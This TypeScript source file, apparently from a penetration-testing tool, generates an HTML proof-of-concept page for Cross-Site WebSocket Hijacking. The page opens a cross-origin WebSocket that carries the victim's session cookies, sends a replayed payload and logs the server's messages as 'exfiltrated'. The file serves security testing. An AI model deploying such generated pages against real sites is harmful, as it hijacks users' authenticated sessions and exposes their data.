import { ParsedRequest } from '../../types';
import { PocGeneratorOptions, escapeHtml, escapeJsString } from './types';

/**
 * Generates a Cross-Site WebSocket Hijacking (CSWSH) Proof-of-Concept payload.
 * Demonstrates unauthorized cross-origin WebSocket connection establishment using ambient cookies.
 */
export function generateWebSocketCsrfPoc(
  request: ParsedRequest,
  options: Partial<PocGeneratorOptions> = {}
): string {
  // Convert http(s) URL to ws(s) URL if needed
  let wsUrl = request.url;
  if (wsUrl.startsWith('https://')) {
    wsUrl = 'wss://' + wsUrl.slice(8);
  } else if (wsUrl.startsWith('http://')) {
    wsUrl = 'ws://' + wsUrl.slice(7);
  } else if (!wsUrl.startsWith('ws://') && !wsUrl.startsWith('wss://')) {
    wsUrl = 'wss://' + wsUrl;
  }

  const comments = options.comments ?? true;

  const codeParts: string[] = [
    '<!DOCTYPE html>',
    '<html lang="en">',
    '<head>',
    '  <meta charset="UTF-8">',
    '  <title>Cross-Site WebSocket Hijacking (CSWSH) PoC</title>',
    '  <style>',
    '    body { font-family: monospace; background: #0b0f19; color: #38bdf8; padding: 20px; }',
    '    #log { background: #030712; border: 1px solid #1e293b; padding: 15px; border-radius: 6px; max-height: 400px; overflow-y: auto; }',
    '    .event { margin-bottom: 8px; }',
    '    .in { color: #34d399; }',
    '    .out { color: #f59e0b; }',
    '    .err { color: #ef4444; }',
    '  </style>',
    '</head>',
    '<body>',
    '  <h2>⚡ Cross-Site WebSocket Hijacking (CSWSH) PoC</h2>',
    `  <p>Target WebSocket Endpoint: <code>${escapeHtml(wsUrl)}</code></p>`,
    '  <div id="log"></div>',
    '',
    '  <script>',
  ];

  if (comments) {
    codeParts.push(
      '    // Cross-Site WebSocket Hijacking (CSWSH) Exploit Artifact',
      '    // The browser initiates the WebSocket handshake attaching ambient session cookies.',
      '    // If the server fails to validate the Origin header, cross-origin communication is established.'
    );
  }

  codeParts.push(
    `    const targetWsUrl = ${escapeJsString(wsUrl)};`,
    '    const logDiv = document.getElementById("log");',
    '',
    '    function appendLog(cls, msg) {',
    '      const el = document.createElement("div");',
    '      el.className = "event " + cls;',
    '      el.textContent = "[" + new Date().toLocaleTimeString() + "] " + msg;',
    '      logDiv.appendChild(el);',
    '      logDiv.scrollTop = logDiv.scrollHeight;',
    '    }',
    '',
    '    appendLog("out", "Initiating cross-origin WebSocket connection to " + targetWsUrl);',
    '    const ws = new WebSocket(targetWsUrl);',
    '',
    '    ws.onopen = function() {',
    '      appendLog("in", "✅ Handshake Successful! Ambient credentials accepted.");',
  );

  if (request.body) {
    codeParts.push(
      `      const initialPayload = ${escapeJsString(request.body)};`,
      '      ws.send(initialPayload);',
      '      appendLog("out", "Dispatched payload: " + initialPayload);'
    );
  }

  codeParts.push(
    '    };',
    '',
    '    ws.onmessage = function(event) {',
    '      appendLog("in", "📩 Exfiltrated incoming message: " + event.data);',
    '    };',
    '',
    '    ws.onerror = function(err) {',
    '      appendLog("err", "❌ WebSocket error or blocked by policy.");',
    '    };',
    '',
    '    ws.onclose = function(e) {',
    '      appendLog("out", "WebSocket connection closed (" + e.code + ").");',
    '    };',
    '  </script>',
    '</body>',
    '</html>'
  );

  return codeParts.join('\n');
}
